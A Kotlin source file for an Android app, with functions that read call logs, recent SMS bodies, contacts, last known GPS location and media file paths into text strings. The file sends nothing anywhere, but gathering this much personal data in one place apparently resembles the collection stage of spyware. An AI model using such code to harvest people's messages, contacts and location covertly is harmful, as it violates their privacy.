package com.example.myapplication3

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.database.Cursor
import android.location.Location
import android.location.LocationManager
import android.net.Uri
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.MediaStore
import androidx.core.app.ActivityCompat

// Retrieve call logs
fun getCallLogs(context: Context): String {
    val callLogsList = StringBuilder()
    val cursor: Cursor? = context.contentResolver.query(
        CallLog.Calls.CONTENT_URI,
        null,
        null,
        null,
        null
    )

    cursor?.use {
        val numberIndex = it.getColumnIndex(CallLog.Calls.NUMBER)
        val typeIndex = it.getColumnIndex(CallLog.Calls.TYPE)
        val dateIndex = it.getColumnIndex(CallLog.Calls.DATE)

        while (it.moveToNext()) {
            val number = it.getString(numberIndex)
            val type = it.getString(typeIndex)
            val date = it.getString(dateIndex)
            callLogsList.append("Number: $number, Type: $type, Date: $date\n")
        }
    }
    return callLogsList.toString()
}

// Retrieve SMS logs
// Retrieve a limited number of SMS logs
fun getSMSLogs(context: Context, limit: Int = 100): String {
    val smsList = StringBuilder()
    val uri: Uri = Uri.parse("content://sms")
    val cursor: Cursor? = context.contentResolver.query(
        uri,
        null,
        null,
        null,
        "date DESC" // Sort by latest SMS first
    )

    cursor?.use {
        val addressIndex = it.getColumnIndex("address")
        val bodyIndex = it.getColumnIndex("body")

        var count = 0
        while (it.moveToNext() && count < limit) {
            val address = it.getString(addressIndex)
            val body = it.getString(bodyIndex)
            smsList.append("From: $address, Message: $body\n")
            count++
        }
    }
    return smsList.toString()
}


// Retrieve contacts
fun getContacts(context: Context): String {
    val contactsList = StringBuilder()
    val uri: Uri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI
    val cursor: Cursor? = context.contentResolver.query(uri, null, null, null, null)

    cursor?.use {
        val nameIndex = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
        val numberIndex = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)

        while (it.moveToNext()) {
            val name = it.getString(nameIndex)
            val number = it.getString(numberIndex)
            contactsList.append("Name: $name, Number: $number\n")
        }
    }
    return contactsList.toString()
}

// Retrieve location
fun getLocation(context: Context): String {
    val locationManager = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager

    if (ActivityCompat.checkSelfPermission(
            context,
            Manifest.permission.ACCESS_FINE_LOCATION
        ) != PackageManager.PERMISSION_GRANTED
    ) {
        return "Permission not granted"
    }

    val location: Location? = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER)
    return location?.let {
        "Latitude: ${it.latitude}, Longitude: ${it.longitude}"
    } ?: "Location not available"
}

// Retrieve media files
fun getMediaFiles(context: Context): List<String> {
    val mediaFiles = mutableListOf<String>()

    // Get images
    val imageCursor: Cursor? = context.contentResolver.query(
        MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
        null,
        null,
        null,
        null
    )

    imageCursor?.use {
        val dataIndex = it.getColumnIndex(MediaStore.Images.Media.DATA)
        while (it.moveToNext()) {
            val imagePath = it.getString(dataIndex)
            mediaFiles.add("Image: $imagePath")
        }
    }

    // Get videos
    val videoCursor: Cursor? = context.contentResolver.query(
        MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
        null,
        null,
        null,
        null
    )

    videoCursor?.use {
        val dataIndex = it.getColumnIndex(MediaStore.Video.Media.DATA)
        while (it.moveToNext()) {
            val videoPath = it.getString(dataIndex)
            mediaFiles.add("Video: $videoPath")
        }
    }

    // Get audio
    val audioCursor: Cursor? = context.contentResolver.query(
        MediaStore.Audio.Media.EXTERNAL_CONTENT_URI,
        null,
        null,
        null,
        null
    )

    audioCursor?.use {
        val dataIndex = it.getColumnIndex(MediaStore.Audio.Media.DATA)
        while (it.moveToNext()) {
            val audioPath = it.getString(dataIndex)
            mediaFiles.add("Audio: $audioPath")
        }
    }

    return mediaFiles
}
